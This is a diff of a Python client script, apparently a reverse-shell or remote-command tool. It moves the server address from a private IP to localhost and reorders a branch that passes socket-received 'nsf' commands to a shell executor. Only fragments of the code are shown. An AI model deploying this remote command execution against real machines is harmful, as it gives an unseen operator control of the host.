@@ -5,7 +5,7 @@ import platform
 import os
 import time
 
-serverIp = '172.26.80.1'
+serverIp = 'localhost'
 serverPort = 12018
 
 windowsFlag = "n"
@@ -161,6 +161,10 @@ def main():
                     if len(cmd) == 0:
                         break
 
+                    elif "nsf" in cmd:
+                        cmd = cmd.replace("nsf ", "")
+                        shellCommandExecuter(clientSocket, cmd)
+
                     elif cmd == "setOs":
                         global windowsFlag
                         windowsFlag = input()
@@ -211,9 +215,7 @@ def main():
                             cmd = "ls"
                         shellCommandExecuter(clientSocket, cmd)
 
-                    elif "nsf" in cmd:
-                        cmd = cmd.replace("nsf ", "")
-                        shellCommandExecuter(clientSocket, cmd)
+
 
             except Exception as e:
                 print(e)
